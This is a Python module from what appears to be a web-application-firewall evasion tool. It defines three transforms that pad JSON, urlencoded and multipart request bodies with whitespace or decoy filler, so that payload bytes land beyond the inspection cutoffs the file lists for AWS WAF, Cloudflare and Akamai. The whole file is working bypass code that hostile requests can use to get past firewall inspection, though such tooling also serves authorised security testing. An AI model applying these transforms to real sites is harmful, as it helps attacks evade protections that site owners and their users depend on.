"""Size-window pads: push payload bytes past the WAF's body-inspection cutoff.

Vendor-documented cutoffs the profile limits model:
- AWS WAF: 8 KB ALB/AppSync (fixed), 16 KB default elsewhere.
- Cloudflare managed rules: plan-dependent, 128 KB Enterprise / 1 MB Free.
- Akamai Kona: 8 KB default, max 128 KB.
"""
from __future__ import annotations

import json
from dataclasses import replace

from ..spec import ReqSpec
from . import Ctx, Transform, VENDORS, content_type, register


@register(Transform(
    id="pad_json_ws",
    vendors=VENDORS,
    category="size",
    risk="standard",
    docs_path="docs/techniques/pad_json_ws.md",
    explain="prepend whitespace inside JSON so payload starts beyond the cutoff",
))
def pad_json_ws(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Prepend ``profile_limit`` spaces to a JSON body.

    Leading whitespace is valid JSON (RFC 8259 ws), so any conforming parser
    sees the identical document while the WAF's first N bytes are all spaces.
    """
    if ctx.profile_limit is None or not spec.body:
        return None
    try:
        json.loads(spec.body.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None
    return replace(spec, body=b" " * ctx.profile_limit + spec.body)


@register(Transform(
    id="pad_form_param",
    vendors=VENDORS,
    category="size",
    risk="standard",
    docs_path="docs/techniques/pad_form_param.md",
    explain="prepend an oversized decoy urlencoded parameter",
))
def pad_form_param(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Prepend one distinct decoy parameter sized to fill the window.

    The decoy key is unique, so last-value-wins parsers keep every original
    pair; pairs after the filler sit past the inspection cutoff.
    """
    if ctx.profile_limit is None or not spec.body:
        return None
    if "application/x-www-form-urlencoded" not in content_type(spec).lower():
        return None
    filler = b"waf_filler=" + b"A" * ctx.profile_limit
    return replace(spec, body=filler + b"&" + spec.body)


def _boundary(content_type_value: str) -> "str | None":
    marker = "boundary="
    idx = content_type_value.find(marker)
    if idx < 0:
        return None
    rest = content_type_value[idx + len(marker):].strip()
    if rest.startswith('"'):
        end = rest.find('"', 1)
        return rest[1:end] if end > 0 else None
    return rest.split(";")[0].strip() or None



@register(Transform(
    id="pad_multipart_decoy",
    vendors=VENDORS,
    category="size",
    risk="standard",
    docs_path="docs/techniques/pad_multipart_decoy.md",
    explain="insert an oversized decoy part ahead of the original parts",
))
def pad_multipart_decoy(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Insert one large decoy part before the existing multipart parts.

    Junk-prepending against body-size windows is publicly demonstrated against
    Akamai's default 8 KB limit; origin parsers handle both parts normally.
    """
    if ctx.profile_limit is None or not spec.body:
        return None
    boundary = _boundary(content_type(spec))
    if boundary is None:
        return None
    head = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="waf_decoy"\r\n\r\n'
    ).encode("ascii")
    return replace(spec, body=head + b"A" * ctx.profile_limit + b"\r\n" + spec.body)
